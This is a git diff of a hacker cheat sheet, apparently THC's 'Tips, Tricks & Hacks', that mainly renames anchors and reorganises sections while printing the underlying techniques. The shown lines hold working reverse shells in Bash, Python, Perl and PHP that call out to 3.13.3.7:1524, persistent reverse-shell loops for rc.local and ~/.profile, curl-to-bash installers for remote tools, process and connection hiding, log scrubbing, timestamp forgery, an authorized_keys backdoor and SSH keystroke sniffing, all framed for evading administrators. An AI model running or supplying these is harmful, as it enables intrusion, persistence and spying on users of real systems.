@@ -1,3 +1,4 @@
+<!-- Use `grip 8080` to render the markdown locally -->
 # THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
@@ -6,87 +7,86 @@ We show the tricks 'as is' without any explanation why they work. You need to kn
 
 Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 
-1. [Bash](#lbwh-anchor)
-   1. [Leave Bash without history](#lbwh-anchor)
-   1. [Hide your command](#hyc-anchor)
-   1. [Hide your arguments](#hya-anchor)
-   1. [Hide a network connection](#hide-a-connection)
+1. [Bash](#bash)
+   1. [Leave Bash without history](#bash-no-history)
+   1. [Hide your commands](#bash-hide-command)
+   1. [Hide your arguments](#bash-hide-arguments)
+   1. [Hide a network connection](#bash-hide-connection)
    1. [Hide a process as user](#hide-a-process-user)
    1. [Hide a process as root](#hide-a-process-root)
    1. [Hide scripts](#hide-scripts)
-1. [SSH](#ais-anchor)
-   1. [Almost invisible SSH](#ais-anchor)
-   1. [SSH tunnel OUT](#sto-anchor)
-   1. [SSH tunnel IN](#sti-anchor)
-   1. [SSH socks5 OUT](#sso-anchor)
-   1. [SSH socks5 IN](#ssi-anchor)
+1. [SSH](#ssh)
+   1. [Almost invisible SSH](#ssh-invisible)
+   1. [SSH tunnel](#ssh-tunnel)
+   1. [SSH socks5 tunnel](#ssh-socks-tunnel)
    1. [SSH to NATed host](#ssh-j) 
-1. [Network](#network-anchor)
-   1. [ARP discover computers on the local network](#adln-anchor)
-   1. [ICMP discover local network](#idln-anchor)
-   1. [Monitor all new TCP connections](#mtc-anchor)
-   1. [Alert on all new TCP connections](#atc-anchor)
-   1. [Find your public IP address](#pip-anchor)
-   1. [Check reachability from around the world](#pingpe-anchor)
-   1. [Check Open Ports](#geo-anchor)
-1. [File Encoding and Transfer](#fe-anchor)
-   1. [uuencode](#feu-anchor)
-   1. [openssl](#feo-anchor)
-   1. [xxd](#fex-anchor)
-   1. [Multiple binaries](#feb-anchor)
-   1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
-   1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
-   1. [File transfer using gs-netcat and sftp](#ftgs-anchor)
-1. [Reverse Shell / Dumb Shell](#reverse)
-   1. [Reverse Shells](#rs-anchor)
-      1. [with gs-netcat](#rswg-anchor)
-      1. [with Bash](#rswb-anchor)
-      1. [without Bash](#rswob-anchor)
-      1. [with Python](#rswpy-anchor)
-      1. [with Perl](#rswpl-anchor)
-      1. [with PHP](#rswphp-anchor)
-   1. [Upgrading the dumb shell](#rsu-anchor)
-      1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
-      1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
-      1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
+1. [Network](#network)
+   1. [ARP discover computers on the local network](#net-arp-discover)
+   1. [ICMP discover local network](#net-icmp-discover)
+   1. [Monitor all new TCP connections](#monitor-tcp)
+   1. [Alert on all new TCP connections](#alert-on-connect)
+   1. [Find your public IP address](#your-ip)
+   1. [Check reachability from around the world](#check-reachable)
+   1. [Check Open Ports](#check-open-ports)
+1. [File Encoding and Transfer](#file-encoding)
+   1. [uuencode](#uuencode)
+   1. [openssl](#file-encoding-openssl)
+   1. [xxd](#file-encoding-xxd)
+   1. [Multiple binaries](#file-encoding-binaries)
+   1. [File transfer using screen from REMOTE to LOCAL](#file-transfer-screen-to-local)
+   1. [File transfer using screen from LOCAL to REMOTE](#file-transfer-to-remote)
+   1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
+1. [Reverse Shell / Dumb Shell](#reverse-shell)
+   1. [Reverse Shells](#reverse-shell)
+      1. [with gs-netcat](#reverse-shell-gs-netcat)
+      1. [with Bash](#reverse-shell-bash)
+      1. [without Bash](#reverse-shell-no-bash)
+      1. [with Python](#reverse-shell-python)
+      1. [with Perl](#reverse-shell-perl)
+      1. [with PHP](#reverse-shell-php)
+   1. [Upgrading the dumb shell](#reverse-shell-upgrade)
+      1. [Upgrade a reverse shell to a pty shell](#reverse-shell-pty)
+      1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
+      1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
 1. [Backdoors](#backdoor)
-   1. [Background reverse shell](#bdrs-anchor)
-   1. [authorized_keys](#bdak-anchor)
-   1. [Remote access an entire network](#bdra-anchor)
-1. [Shell Hacks](#sh-anchor)
-   1. [Shred files (secure delete)](#shsf-anchor)
-   1. [Shred files without *shred*](#shsfwo-anchor)
-   1. [Restore the date of a file](#shrdf-anchor)
-   1. [Clean logfile](#shcl-anchor)
-   1. [Hide files from a User without root privileges](#shhu-anchor)
-1. [Crypto](#cr-anchor)
-   1. [Generate quick random Password](#crgrp-anchor)
-   1. [Linux transportable encrypted filesystems](#crltefs-anchor)
-      1. [cryptsetup](#crltefs-anchor)
-      1. [EncFS](#crencfs-anchor)
-   1. [Encrypting a file](#cref-anchor)
-1. [Sniffing a user's SSH session](#misc-anchor)
-   1. [with strace](#sss-anchor)
-   1. [with script](#ssswos-anchor)
-   1. [with a wrapper script](#ssswor-anchor)
-   1. [with SSH-IT](#sshit-anchor)
-1. [VPN and Shells](#shell)
+   1. [Background reverse shell](#backdoor-background-reverse-shell)
+   1. [authorized_keys](#backdoor-auth-keys)
+   1. [Remote access an entire network](#backdoor-network)
+1. [Shell Hacks](#shell-hacks)
+   1. [Shred files (secure delete)](#shred-erase)
+   1. [Shred files without *shred*](#shred-without-shred)
+   1. [Restore the date of a file](#restore-timestamp)
+   1. [Clean logfile](#shell-clean-logs)
+   1. [Hide files from a User without root privileges](#shell-hide-files)
+   1. [Find out Linux Distro](#linux-info)
+1. [Crypto](#crypto)
+   1. [Generate quick random Password](#gen-password)
+   1. [Linux transportable encrypted filesystems](#crypto-filesystem)
+      1. [cryptsetup](#crypto-filesystem)
+      1. [EncFS](#encfs)
+   1. [Encrypting a file](#encrypting-file)
+1. [Sniffing a user's SSH session](#ssh-sniffing)
+   1. [with strace](#ssh-sniffing-strace)
+   1. [with script](#ssh-sniffing-script)
+   1. [with a wrapper script](#ssh-sniffing-wrapper)
+   1. [with SSH-IT](#ssh-sniffing-sshit)
+1. [VPN and Shells](#vpn-shell)
    1. [Disposable Root Servers](#shell)
    1. [VPN/VPS Providers](#vpn)
-1. [Post Compromise](#post-hack)
-   1. [Find out Linux Distribution](#post-hack)
-1. [Miscellaneous](#misc-anchor)
-   1. [OSINT Intelligence Gathering](#osint-anchor)
+1. [OSINT Intelligence Gathering](#osint)
+1. [Miscellaneous](#misc)
    1. [Tools of the trade](#tools)
-   1. [Cool Linux commands](#cool-anchor)
-   1. [tmux](#tmux-anchor)
-   1. [Useful commands](#useful-anchor)
+   1. [Cool Linux commands](#cool-linux-commands)
+   1. [tmux](#tmux)
+   1. [Useful commands](#useful-commands)
 1. [Other Sites](#others)
     
    
 
 ---
-<a id="lbwh-anchor"></a>
+<a id="bash"></a>
+## 1. Bash / Shell
+<a id="bash-no-history"></a>
 **1.i. Leave Bash without history:**
 
 Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 
@@ -109,7 +109,7 @@ Any command starting with a " " (space) will [not get logged to history](https:/
 $  id
 ```
 
-<a id="hyc-anchor"></a>
+<a id="bash-hide-command"></a>
 **1.ii. Hide your command**
 
 ```shell
@@ -128,7 +128,7 @@ PATH=.:$PATH syslogd -T0 10.0.2.1/24
 ```
 In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.
 
-<a id="hya-anchor"></a>
+<a id="bash-hide-arguments"></a>
 **1.iii. Hide your arguments**
 
 Download [zap-args.c](src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
@@ -139,7 +139,7 @@ LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
 ```
 Note: There is a gdb variant as well. Anyone?
 
-<a id="hide-a-connection"></a>
+<a id="bash-hide-connection"></a>
 **1.iv. Hide a Network Connection**
 
 The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).
@@ -231,45 +231,41 @@ ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prn
 (The same works for `lsof`, `ss` and `ls`)
 
 ---
-<a id="ais-anchor"></a>
+<a id="ssh"></a>
+## 2. SSH
+<a id="ssh-invisible"></a>
 **2.i. Almost invisible SSH**
 ```sh
 ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
 ```
 This will not add your user to the */var/log/utmp* file and you won't show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
 
-<a id="sto-anchor"></a>
-**2.ii SSH tunnel OUT**
+<a id="ssh-tunnel"></a>
+**2.ii SSH tunnel**
 
 We use this all the time to circumvent local firewalls and IP filtering:
 ```sh
 ssh -g -L31337:1.2.3.4:80 user@server.org
 ```
-You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).
+You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 Clever hackers use the keyboard combination `~C` to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).
-
-<a id="sti-anchor"></a>
-**2.iii SSH tunnel IN**
 
 We use this to give access to a friend to an internal machine that is not on the public Internet:
 ```sh
 ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
 ```
-Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).
+Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
-<a id="sso-anchor"></a>
-**2.iv SSH socks4/5 OUT**
+<a id="ssh-socks-tunnel"></a>
+**2.iii SSH socks4/5 tunnel**
 
 OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.
 
 ```sh
 ssh -D 1080 user@server.org
 ```
-Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).
-
-<a id="ssi-anchor"></a>
-**2.v SSH socks4/5 IN**
+Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.
 
@@ -277,10 +273,10 @@ This is the reverse of the above example. It give others access to your *local* 
 ssh -g -R 1080 user@server.org
 ```
 
-The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).
+The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-j"></a>
-**2.vi SSH to a host behind NAT**
+**2.iv SSH to a host behind NAT**
 
 [ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).
 
@@ -307,8 +303,9 @@ ssh -J 5dmxf27tl4kx@ssh-j.com root@5dmxf27tl4kx
 The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.
 
 ---
-<a id="network-anchor"></a>
-<a id="adln-anchor"></a>
+<a id="network"></a>
+## 3. Network
+<a id="net-arp-discover"></a>
 **3.i. ARP discover computers on the local network**
 ```sh
 nmap -r -sn -PR 192.168.0.1/24
@@ -318,7 +315,7 @@ This will Arp-ping all local machines just like *arping*. ARP ping always seems 
 nmap -thc
 ```
 
-<a id="idln-anchor"></a>
+<a id="net-icmp-discover"></a>
 **3.ii. ICMP discover local network**
 
 ...and when we do not have nmap and we can not do broadcast pings (requires root) then we use this:
@@ -326,14 +323,14 @@ nmap -thc
 for x in `seq 1 254`; do ping -on -c 3 -i 0.1 -W 200 192.168.1.$x | grep 'bytes from' | cut -f4 -d" " | sort -u; done
 ```
 
-<a id="mtc-anchor"></a>
+<a id="monitor-tcp"></a>
 **3.iii. Monitor all new TCP connections**
 
 ```sh
 tcpdump -n "tcp[tcpflags] == tcp-syn"
 ```
 
-<a id="atc-anchor"></a>
+<a id="alert-on-connect"></a>
 **3.iv. Alert on new TCP connections**
 
 Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from the target system (could be an admin!).
@@ -342,7 +339,7 @@ Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from the target syst
 tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
 
-<a id="pip-anchor"></a>
+<a id="your-ip"></a>
 **3.v. Find your public IP address**
 
 ```sh
@@ -371,12 +368,12 @@ Check if TOR is working:
 curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org/api/ip
 ```
 
-<a id="pingpe-anchor"></a>
+<a id="check-reachable"></a>
 **3.vi. Check reachability from around the world**
 
 The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.
 
-<a id="geo-anchor"></a>
+<a id="check-open-ports"></a>
 **3.vii. Check Open Ports on an IP**
 
 ```shell
@@ -384,8 +381,9 @@ curl https://internetdb.shodan.io/1.1.1.1
 ```
 
 ---
-<a id="fe-anchor"></a>
-<a id="feu-anchor"></a>
+<a id="file-encoding"></a>
+## 4. File Encoding
+<a id="uuencode"></a>
 **4.i. File Encoding - uuencode**
 
 Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).
@@ -408,7 +406,7 @@ begin 644 issue-net-COPY
 end
 ```
 
-<a id="feo-anchor"></a>
+<a id="file-encoding-openssl"></a>
 **4.ii. File Encoding - openssl**
 
 Openssl can be used when uu/decode/encode is not available on the remote system:
@@ -423,7 +421,7 @@ Cut & paste the output into this command:
 $ openssl base64 -d >issue.net-COPY
 ```
 
-<a id="fex-anchor"></a>
+<a id="file-encoding-xxd"></a>
 **4.iii. File Encoding - xxd**
 
 ..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.
@@ -439,7 +437,7 @@ Decode:
 ```
 $ xxd -p -r >issue.net-COPY
 ```
-<a id="feb-anchor"></a>
+<a id="file-encoding-binaries"></a>
 **4.iv. File Encoding - Multiple Binaries**
 
 Method 1: Using *shar* to create a self extracting shell script with binaries inside:
@@ -461,7 +459,7 @@ Transfer *stuff.tgz.b64* to the remote system and execute:
 openssl base64 -d <stuff.tgz.b64 | tar xfz -
 ```
 
-<a id="ftsrl-anchor"></a>
+<a id="file-transfer-screen-to-local"></a>
 **4.v. File transfer - using *screen* from REMOTE to LOCAL**
 
 Transfer a file FROM the remote system to your local system:
@@ -488,7 +486,7 @@ openssl base64 -d <screen-xfer.txt
 rm -rf screen-xfer.txt
 ```
 
-<a id="ftslr-anchor"></a>
+<a id="file-transfer-to-remote"></a>
 **4.vi. File transfer - using *screen* from LOCAL to REMOTE**
 
 On your local system (from within a different shell) encode the data:
@@ -513,7 +511,7 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
-<a id="ftgs-anchor"></a>
+<a id="file-transfer-gs-netcat"></a>
 **4.vii. File transfer - using gs-netcat and sftp**
 
 Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).
@@ -528,12 +526,12 @@ sftp -D gs-netcat                                        # Workstation
 ```
 
 ---
-<a id="reverse"></a>
-## 5. Reverse Shells
-<a id="rswg-anchor"></a>
+<a id="reverse-shell"></a>
+## 5. Reverse Shell / Dumb Shell
+<a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat**
 
-Use [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
+Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
 gs-netcat -s MySecret -l -i    # Host
@@ -546,7 +544,7 @@ gs-netcat -s MySecret -i
 ```
 Use -T to tunnel trough TOR.
 
-<a id="rswb-anchor"></a>
+<a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
 
 Start netcat to listen on port 1524 on your system:
@@ -559,7 +557,7 @@ On the remote system, this command will connect back to your system (IP = 3.13.3
 setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
 ```
 
-<a id="rswob-anchor"></a>
+<a id="reverse-shell-no-bash"></a>
 **5.i.c. Reverse shell without Bash**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
@@ -590,13 +588,13 @@ tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
 Note: Use */tmp/.fio* if */dev/shm* is not available.
 Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
-<a id="rswpy-anchor"></a>
+<a id="reverse-shell-python"></a>
 **5.i.d. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-<a id="rswpl-anchor"></a>
+<a id="reverse-shell-perl"></a>
 **5.i.e. Reverse shell with Perl**
 
 ```sh
@@ -605,15 +603,15 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 # method 2
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
-<a id="rswphp-anchor"></a>
+<a id="reverse-shell-php"></a>
 **5.i.e. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
-<a id="rsu-anchor"></a>
-<a id="rsup-anchor"></a>
+<a id="reverse-shell-upgrade"></a>
+<a id="reverse-shell-pty"></a>
 **5.ii.a. Upgrade a reverse shell to a PTY shell**
 
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:
@@ -629,7 +627,7 @@ Or:
 exec python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-<a id="rsup2-anchor"></a>
+<a id="reverse-shell-interactive"></a>
 **5.ii.b. Upgrade a reverse shell to a fully interactive shell**
 
 ...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:
@@ -649,7 +647,7 @@ export TERM=xterm-256color
 stty rows 24 columns 80
 ```
 
-<a id="rssc-anchor"></a>
+<a id="reverse-shell-socat"></a>
 **5.ii.c. Reverse shell with socat (fully interactive)**
 
 ...or install socat and get it done without much fiddling about:
@@ -674,30 +672,30 @@ or
 bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
 ```
 
-<a id="bdrs-anchor"></a>
+<a id="backdoor-background-reverse-shell"></a>
 **6.i. Background reverse shell**
 
-A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
+A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
 
 ```sh
-while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done &>/dev/null &
+while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done &>/dev/null &
 ```
 
 or add to */etc/rc.local*:
 ```sh
-nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done' &>/dev/null &
+nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &
 ```
 
 or the user's *~/.profile* (also stops multiple instances from being started):
 ```sh
 fuser /dev/shm/.busy &>/dev/null
 if [ $? -eq 1 ]; then
-        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 3600; done' &>/dev/null &
+        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
 fi
 ```
 
 
-<a id="bdak-anchor"></a>
+<a id="backdoor-auth-keys"></a>
 **6.ii. authorized_keys**
 
 Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>
@@ -714,7 +712,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
 u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
 c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 ```
-<a id="bdra-anchor"></a>
+<a id="backdoor-network"></a>
 **6.iii. Remote Access to an entire network**
 
 Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the Global Relay network without the need to run your own server (e.g. directly from your workstation):
@@ -734,15 +732,16 @@ socat -  "SOCKS4a:127.1:route.local:22"
 Use -T to use TOR.
 
 ---
-<a id="sh-anchor"></a>
-<a id="shsf-anchor"></a>
+<a id="shell-hacks"></a>
+## 7. Shell Hacks
+<a id="shred-erase"></a>
 **7.i. Shred & Erase a file**
 
 ```sh
 shred -z foobar.txt
 ```
 
-<a id="shsfwo-anchor"></a>
+<a id="shred-without-shred"></a>
 **7.ii. Shred & Erase without *shred***
 ```sh
 FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
@@ -751,7 +750,7 @@ Note: Or deploy your files in */dev/shm* directory so that no data is written to
 
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
-<a id="shrdf-anchor"></a>
+<a id="restore-timestamp"></a>
 **7.iii. Restore the date of a file**
 
 Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
@@ -760,7 +759,7 @@ Let's say you have modified */etc/passwd* but the file date now shows that */etc
 touch -r /etc/shadow /etc/passwd
 ```
 
-<a id="shcl-anchor"></a>
+<a id="shell-clean-logs"></a>
 **7.iv. Clear logfile**
 
 This will reset the logfile to 0 without having to restart syslogd etc:
@@ -774,7 +773,7 @@ cd /dev/shm
 grep -Fv 'thc.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
 ```
 
-<a id="shhu-anchor"></a>
+<a id="shell-hide-files"></a>
 **7.v. Hide files from that User without root privileges**
 
 Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
@@ -802,8 +801,18 @@ mkdir $'\t'
 cd $'\t'
 ```
 
-<a id="cr-anchor"></a>
-<a id="crgrp-anchor"></a>
+<a id="linux-info"></a>
+**7.vi. Find out Linux Distro**
+
+```sh
+# Find out Linux Distribution
+uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
+```
+
+---
+<a id="crypto"></a>
+## 8. Crypto
+<a id="gen-password"></a>
 **8.i. Generate quick random Password**
 
 Good for quick passwords without human element.
@@ -824,7 +833,7 @@ or make it alpha-numeric
 head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
 ```
 
-<a id="crltefs-anchor"></a>
+<a id="crypto-filesystem"></a>
 **8.ii.a. Linux transportable encrypted filesystems - cryptsetup**
 
 Create a 256MB large encrypted file system. You will be prompted for a password.
@@ -851,7 +860,7 @@ umount /mnt/crypted
 cryptsetup close crypted
 losetup -d /dev/loop0
 ```
-<a id="crencfs-anchor"></a>
+<a id="encfs"></a>
 **8.ii.b. Linux transportable encrypted filesystems - EncFS**
 
 Create ```.sec``` and store the encrypted data in ```.raw```:
@@ -865,40 +874,41 @@ unmount:
 fusermount -u .sec
 ```
 
-<a id="cref-anchor"></a>
+<a id="encrypting-file"></a>
 **8.iii Encrypting a file**
 
 Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):
 
-Encrypt:
 ```sh
+# Encrypt
 openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
 ```
 
-Decrypt:
 ```sh
+# Decrypt
 openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
 ```
 
 ---
-<a id="misc-anchor"></a>
-<a id="sss-anchor"></a>
+<a id="ssh-sniffing"></a>
+## 9. SSH Sniffing
+<a id="ssh-sniffing-strace"></a>
 **9.i Sniff a user's SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
-<a id="ssswos-anchor"></a>
+<a id="ssh-sniffing-script"></a>
 **9.ii Sniff a user's SSH session with script**
 
 The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
 ```sh
 echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 ```
-Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
-<a id="ssswor-anchor"></a>
+<a id="ssh-sniffing-wrapper"></a>
 **9.iii. Sniff a user's SSH session with a wrapper script**
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
@@ -940,7 +950,7 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
-<a id="sshit-anchor"></a>
+<a id="ssh-sniffing-sshit"></a>
 **9.iv Sniff a user's SSH session using SSH-IT**
 
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
@@ -950,6 +960,8 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 ---
+<a id="vpn-shell"></a>
+## 10. VPN & Shells
 <a id="shell"></a>
 **10.i. Disposable Root Servers**
 
@@ -985,18 +997,9 @@ Proxies (we dont use any of those)
 Many other services (for free)  
 1. https://free-for.dev/
 
-
 ---
-<a id="post-hack"></a>
-**11.i. Find out Linux Distribution**
-
-```sh
-uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
-```
-
----
-<a id="osint-anchor"></a>
-**12.i. Intelligence Gathering**
+<a id="osint"></a>
+## 11. Intelligence Gathering
 
 | OSINT Hacker Tools ||
 | --- | --- |
@@ -1024,8 +1027,11 @@ uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
 | http://breached65xqh64s7xbkvqgg7bmj4nj7656hcb7x4g42x753r7zmejqd.onion/ | Live Data Breach information |
 | https://data.ddosecrets.com/ | Database Dumps
 
-<a id="Tools"></a>
-**12.ii. Tools**
+---
+<a id="misc"></a>
+## 12. Miscellaneous
+<a id="tools"></a>
+**12.i. Tools of the trade**
 
 Comms
 1. https://www.cs.email/ - Disposable emails (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
@@ -1074,16 +1080,14 @@ Mindmaps & Knowledge
 1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
